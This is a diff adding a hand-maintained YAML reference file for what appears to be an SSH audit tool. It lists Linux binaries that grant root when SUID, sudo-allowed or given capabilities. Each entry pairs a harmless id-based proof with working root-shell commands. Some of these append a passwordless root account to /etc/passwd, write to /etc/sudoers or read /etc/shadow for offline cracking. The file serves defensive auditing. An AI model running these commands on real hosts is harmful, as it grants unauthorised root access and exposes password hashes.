@@ -1,0 +1,402 @@
+# GTFOBins-like reference: binaries that grant privilege escalation when they
+# are SUID-root, allowed via sudo, or carry Linux capabilities.
+#
+# Maintained by hand. Sources: https://gtfobins.github.io/ and operational
+# experience. Update deliberately; every change is reviewable in git.
+#
+# Schema (per entry):
+#   name        canonical binary name (matched on basename)
+#   aliases     other basenames / prefixes that behave identically
+#   match       optional: "prefix" -> alias/name match on a leading substring
+#               (used for versioned interpreters: python3.11, perl5.34, ...)
+#   vectors     which escalation vectors this binary enables:
+#                 suid | sudo | capabilities
+#   capability  capability that makes it dangerous (when 'capabilities' listed)
+#   proof       NON-DESTRUCTIVE command template per vector. Runs `id` (or reads
+#               a root-only file) so we can CONFIRM uid=0 without changing
+#               anything. Tokens: {path} {sudocmd}
+#   exploit     what a real attacker runs to get an interactive root shell.
+#               NEVER executed by sshaudit -- printed in the report as
+#               reproduction steps.
+#   notes       caveats
+#
+# proof templates are eval'd by the remote script. They come ONLY from this
+# versioned, trusted file -- never from the audited host.
+
+schema: 1
+
+binaries:
+  - name: find
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} . -maxdepth 0 -exec id ';' -quit"
+      sudo: "{sudocmd} . -maxdepth 0 -exec id ';' -quit"
+    exploit:
+      suid: '{path} . -exec /bin/sh -p \; -quit'
+      sudo: 'sudo find . -exec /bin/sh \; -quit'
+
+  - name: bash
+    aliases: [sh, dash, rbash, ash]
+    vectors: [suid, sudo]
+    proof:
+      suid: '{path} -p -c id'
+      sudo: '{sudocmd} -c id'
+    exploit:
+      suid: '{path} -p'
+      sudo: 'sudo bash'
+
+  - name: awk
+    aliases: [gawk, mawk, nawk]
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} 'BEGIN {system(\"id\")}'"
+      sudo: "{sudocmd} 'BEGIN {system(\"id\")}'"
+    exploit:
+      suid: "{path} 'BEGIN {system(\"/bin/sh\")}'"
+      sudo: "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
+
+  - name: python
+    aliases: [python2, python3]
+    match: prefix
+    vectors: [suid, sudo, capabilities]
+    capability: cap_setuid
+    proof:
+      suid: '{path} -c "import os,sys; os.setuid(0); os.system(chr(105)+chr(100))"'
+      sudo: '{sudocmd} -c "import os; os.system(chr(105)+chr(100))"'
+      capabilities: '{path} -c "import os; os.setuid(0); os.system(chr(105)+chr(100))"'
+    exploit:
+      suid: '{path} -c "import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")"'
+      sudo: 'sudo python -c "import os; os.execl(\"/bin/sh\",\"sh\")"'
+      capabilities: '{path} -c "import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")"'
+    notes: "SUID on the interpreter binary itself (rare) or cap_setuid+ep."
+
+  - name: perl
+    match: prefix
+    vectors: [suid, sudo, capabilities]
+    capability: cap_setuid
+    proof:
+      suid: '{path} -e "$>=0; system(q(id));"'
+      sudo: '{sudocmd} -e "system(q(id));"'
+      capabilities: '{path} -e "use POSIX qw(setuid); POSIX::setuid(0); system(q(id));"'
+    exploit:
+      suid: '{path} -e "exec q(/bin/sh);"'
+      sudo: 'sudo perl -e "exec q(/bin/sh);"'
+      capabilities: '{path} -e "use POSIX qw(setuid); POSIX::setuid(0); exec q(/bin/sh);"'
+
+  - name: ruby
+    vectors: [suid, sudo, capabilities]
+    capability: cap_setuid
+    proof:
+      suid: "{path} -e 'Process::Sys.setuid(0); system(\"id\")'"
+      sudo: "{sudocmd} -e 'system(\"id\")'"
+      capabilities: "{path} -e 'Process::Sys.setuid(0); system(\"id\")'"
+    exploit:
+      suid: "{path} -e 'exec \"/bin/sh\"'"
+      sudo: "sudo ruby -e 'exec \"/bin/sh\"'"
+      capabilities: "{path} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
+
+  - name: node
+    aliases: [nodejs]
+    vectors: [suid, sudo, capabilities]
+    capability: cap_setuid
+    proof:
+      suid: '{path} -e "process.setuid(0); require(''child_process'').execSync(''id'',{stdio:''inherit''})"'
+      sudo: '{sudocmd} -e "require(''child_process'').execSync(''id'',{stdio:''inherit''})"'
+      capabilities: '{path} -e "process.setuid(0); require(''child_process'').execSync(''id'',{stdio:''inherit''})"'
+    exploit:
+      suid: '{path} -e "process.setuid(0); require(''child_process'').spawn(''/bin/sh'',{stdio:''inherit''})"'
+      sudo: 'sudo node -e "require(''child_process'').spawn(''/bin/sh'',{stdio:''inherit''})"'
+      capabilities: '{path} -e "process.setuid(0); require(''child_process'').spawn(''/bin/sh'',{stdio:''inherit''})"'
+
+  - name: php
+    match: prefix
+    vectors: [suid, sudo, capabilities]
+    capability: cap_setuid
+    proof:
+      suid: "{path} -r 'posix_setuid(0); system(\"id\");'"
+      sudo: "{sudocmd} -r 'system(\"id\");'"
+      capabilities: "{path} -r 'posix_setuid(0); system(\"id\");'"
+    exploit:
+      suid: "{path} -r 'posix_setuid(0); pcntl_exec(\"/bin/sh\");'"
+      sudo: "sudo php -r 'pcntl_exec(\"/bin/sh\");'"
+      capabilities: "{path} -r 'posix_setuid(0); pcntl_exec(\"/bin/sh\");'"
+
+  - name: lua
+    match: prefix
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -e 'os.execute(\"id\")'"
+      sudo: "{sudocmd} -e 'os.execute(\"id\")'"
+    exploit:
+      suid: "{path} -e 'os.execute(\"/bin/sh\")'"
+      sudo: "sudo lua -e 'os.execute(\"/bin/sh\")'"
+
+  - name: vim
+    aliases: [vi, rvim, view, vimdiff]
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -E -s -c ':!id' -c ':q!' /dev/null"
+      sudo: "{sudocmd} -E -s -c ':!id' -c ':q!' /dev/null"
+    exploit:
+      suid: "{path} -c ':!/bin/sh'"
+      sudo: "sudo vim -c ':!/bin/sh'"
+    notes: "Also: :py3 / :lua shells inside vim if compiled with them."
+
+  - name: nano
+    aliases: [rnano, pico]
+    vectors: [suid, sudo]
+    proof:
+      sudo: "true  # nano cannot run a command non-interactively; report as writable-file primitive"
+    exploit:
+      suid: "{path} -> ^R^X 'reset; id'"
+      sudo: "sudo nano  then  ^R ^X  reset; sh 1>&0 2>&0"
+    notes: "Confirmation is limited: nano gives arbitrary file write as root (edit /etc/passwd). Marked potential unless file-write is separately proven."
+
+  - name: less
+    aliases: [more, most, pg]
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} /etc/profile -e -c  # then '!id' -- interactive; treated as potential"
+      sudo: "{sudocmd} /etc/profile  # then '!id'"
+    exploit:
+      suid: "{path} /etc/profile   then type  !/bin/sh"
+      sudo: "sudo less /etc/profile   then  !/bin/sh"
+    notes: "Pager escape is interactive; sshaudit reports it as potential (needs a TTY)."
+
+  - name: ed
+    vectors: [suid, sudo]
+    proof:
+      suid: "printf '!id\\nq\\n' | {path}"
+      sudo: "printf '!id\\nq\\n' | {sudocmd}"
+    exploit:
+      suid: "{path}  then  !/bin/sh"
+      sudo: "sudo ed  then  !/bin/sh"
+
+  - name: tar
+    vectors: [suid, sudo, capabilities]
+    capability: cap_dac_read_search
+    proof:
+      suid: "{path} -cf /dev/null --checkpoint=1 --checkpoint-action=exec=id /etc/hostname"
+      sudo: "{sudocmd} -cf /dev/null --checkpoint=1 --checkpoint-action=exec=id /etc/hostname"
+      capabilities: "{path} -cf /tmp/.sshaudit_$$ -P /etc/shadow >/dev/null 2>&1 && tar -xOf /tmp/.sshaudit_$$ etc/shadow | head -c 1 && rm -f /tmp/.sshaudit_$$"
+    exploit:
+      suid: "{path} -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh /etc/hostname"
+      sudo: "sudo tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh /etc/hostname"
+      capabilities: "tar -cf out.tar -P /etc/shadow && tar -xf out.tar   # read any file"
+    notes: "cap_dac_read_search lets tar read root-only files (e.g. /etc/shadow); proof reads one byte then deletes the temp archive."
+
+  - name: rsync
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -e 'sh -c id' 127.0.0.1:/dev/null /dev/null 2>/dev/null || true"
+      sudo: "{sudocmd} --rsh='sh -c id' 127.0.0.1:/dev/null /tmp/ 2>/dev/null || true"
+    exploit:
+      suid: "{path} -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null /dev/null"
+      sudo: "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null /dev/null"
+
+  - name: env
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} id"
+      sudo: "{sudocmd} id"
+    exploit:
+      suid: "{path} /bin/sh -p"
+      sudo: "sudo env /bin/sh"
+
+  - name: nice
+    aliases: [ionice, nohup, stdbuf, setarch, taskset, chrt, timeout, unshare]
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} id"
+      sudo: "{sudocmd} id"
+    exploit:
+      suid: "{path} /bin/sh"
+      sudo: "sudo nice /bin/sh"
+    notes: "Generic 'run a program' wrappers: whatever follows inherits the privileges."
+
+  - name: xargs
+    vectors: [suid, sudo]
+    proof:
+      suid: "echo | {path} -I{} id"
+      sudo: "echo | {sudocmd} -I{} id"
+    exploit:
+      suid: "echo | {path} -I{} /bin/sh -p"
+      sudo: "echo | sudo xargs -I{} /bin/sh"
+
+  - name: make
+    vectors: [suid, sudo]
+    proof:
+      suid: "COMMAND='id'; {path} -s --eval=\"x:;@$COMMAND\" x"
+      sudo: "COMMAND='id'; {sudocmd} -s --eval=\"x:;@$COMMAND\" x"
+    exploit:
+      suid: "{path} -s --eval='x:;@/bin/sh -p' x"
+      sudo: "sudo make -s --eval='x:;@/bin/sh' x"
+
+  - name: gdb
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -nx -batch -ex 'python import os; os.system(\"id\")'"
+      sudo: "{sudocmd} -nx -batch -ex 'python import os; os.system(\"id\")'"
+    exploit:
+      suid: "{path} -nx -ex 'python import os; os.execl(\"/bin/sh\",\"sh\")' -ex quit"
+      sudo: "sudo gdb -nx -ex 'python import os; os.execl(\"/bin/sh\",\"sh\")' -ex quit"
+
+  - name: socat
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -T1 - EXEC:id"
+      sudo: "{sudocmd} -T1 - EXEC:id"
+    exploit:
+      suid: "{path} stdin exec:/bin/sh"
+      sudo: "sudo socat stdin exec:/bin/sh"
+
+  - name: tclsh
+    aliases: [wish]
+    vectors: [suid, sudo]
+    proof:
+      suid: "echo 'exec id >@stdout; exit' | {path}"
+      sudo: "echo 'exec id >@stdout; exit' | {sudocmd}"
+    exploit:
+      suid: "{path}  then  exec /bin/sh <@stdin >@stdout 2>@stderr"
+      sudo: "sudo tclsh  then  exec /bin/sh <@stdin >@stdout 2>@stderr"
+
+  - name: expect
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -c 'spawn id; interact'"
+      sudo: "{sudocmd} -c 'spawn id; interact'"
+    exploit:
+      suid: "{path} -c 'spawn /bin/sh; interact'"
+      sudo: "sudo expect -c 'spawn /bin/sh; interact'"
+
+  - name: flock
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -u / id"
+      sudo: "{sudocmd} -u / id"
+    exploit:
+      suid: "{path} -u / /bin/sh -p"
+      sudo: "sudo flock -u / /bin/sh"
+
+  - name: strace
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -o /dev/null id"
+      sudo: "{sudocmd} -o /dev/null id"
+    exploit:
+      suid: "{path} -o /dev/null /bin/sh -p"
+      sudo: "sudo strace -o /dev/null /bin/sh"
+
+  - name: dd
+    vectors: [sudo]
+    proof:
+      sudo: "true  # dd = arbitrary file write as root; report as file-write primitive"
+    exploit:
+      sudo: "echo 'attacker::0:0::/root:/bin/sh' | sudo dd of=/etc/passwd oflag=append conv=notrunc"
+    notes: "Destructive if misused. sshaudit never runs the write; reports as potential file-write-to-root."
+
+  - name: tee
+    vectors: [sudo]
+    proof:
+      sudo: "true  # tee = arbitrary file write as root"
+    exploit:
+      sudo: "echo '...' | sudo tee -a /etc/sudoers"
+    notes: "File-write primitive only; not executed."
+
+  - name: cp
+    vectors: [sudo]
+    proof:
+      sudo: "true  # cp can overwrite root-owned files or read root-only files"
+    exploit:
+      sudo: "sudo cp /bin/sh /tmp/rootsh && sudo chmod +s /tmp/rootsh   # if chmod also allowed"
+    notes: "File read/write primitive; not executed."
+
+  - name: systemctl
+    vectors: [sudo]
+    proof:
+      sudo: "true  # systemctl can load an attacker-controlled unit that runs as root"
+    exploit:
+      sudo: "write unit with ExecStart=/bin/sh -c 'id > /tmp/o'; sudo systemctl link/start it"
+    notes: "Requires writing a unit file; sshaudit reports as potential (would create a persistent artifact)."
+
+  - name: apt
+    aliases: [apt-get, dpkg]
+    vectors: [sudo]
+    proof:
+      sudo: "true  # apt pre/post-invoke hooks run arbitrary commands as root"
+    exploit:
+      sudo: "sudo apt-get update -o APT::Update::Pre-Invoke::='id'"
+    notes: "The Pre-Invoke proof is essentially harmless (runs id) but touches apt lists; report as potential unless explicitly enabled."
+
+  - name: git
+    vectors: [sudo]
+    proof:
+      sudo: "{sudocmd} -p help config   # then '!id' in the pager  (interactive)"
+    exploit:
+      sudo: "sudo git -p help config    then  !/bin/sh"
+    notes: "Pager / hook based; interactive -> potential."
+
+  - name: mount
+    vectors: [sudo, capabilities]
+    capability: cap_sys_admin
+    proof:
+      sudo: "true  # mount with sudo enables bind-mount / device tricks to root"
+    exploit:
+      sudo: "sudo mount -o bind /bin/false /usr/bin/passwd   (varies)"
+    notes: "Broad primitive; not exercised."
+
+  - name: busybox
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} sh -c id"
+      sudo: "{sudocmd} sh -c id"
+    exploit:
+      suid: "{path} sh"
+      sudo: "sudo busybox sh"
+
+  - name: base64
+    aliases: [cat, head, tail, cut, nl, xxd, hexdump, od, sort, grep]
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} /etc/shadow | head -c 16"
+      sudo: "{sudocmd} /etc/shadow | head -c 16"
+    exploit:
+      suid: "{path} /etc/shadow   # then crack root hash offline"
+      sudo: "sudo base64 /etc/shadow"
+    notes: "File-READ primitive: confirmation = we read bytes of /etc/shadow. No root shell, but path to root via offline crack."
+
+  - name: openssl
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} enc -in /etc/shadow 2>/dev/null | head -c 8"
+      sudo: "{sudocmd} enc -in /etc/shadow 2>/dev/null | head -c 8"
+    exploit:
+      suid: "{path} enc -in /etc/shadow -base64"
+      sudo: "sudo openssl enc -in /etc/shadow -base64"
+    notes: "File-read primitive (also engine-load RCE on some builds)."
+
+  - name: pkexec
+    vectors: [sudo]
+    proof:
+      sudo: "{sudocmd} /bin/id"
+    exploit:
+      sudo: "sudo pkexec /bin/sh"
+
+  - name: capsh
+    vectors: [suid, sudo]
+    proof:
+      suid: "{path} -- -c id"
+      sudo: "{sudocmd} -- -c id"
+    exploit:
+      suid: "{path} --gid=0 --uid=0 --"
+      sudo: "sudo capsh --"
+
+  - name: zip
+    vectors: [suid, sudo]
+    proof:
+      suid: "TF=/tmp/.sa_$$; touch $TF.txt; {path} $TF.zip $TF.txt -T -TT 'sh -c id' >/dev/null 2>&1; rm -f $TF.zip $TF.txt"
+      sudo: "TF=/tmp/.sa_$$; touch $TF.txt; {sudocmd} $TF.zip $TF.txt -T -TT 'sh -c id' >/dev/null 2>&1; rm -f $TF.zip $TF.txt"
+    exploit:
+      suid: "{path} x.zip /etc/hostname -T -TT 'sh -c \"/bin/sh -p\"'"
+      sudo: "sudo zip x.zip /etc/hostname -T -TT 'sh -c \"/bin/sh\"'"
+    notes: "Proof creates and immediately removes a temp zip in /tmp."
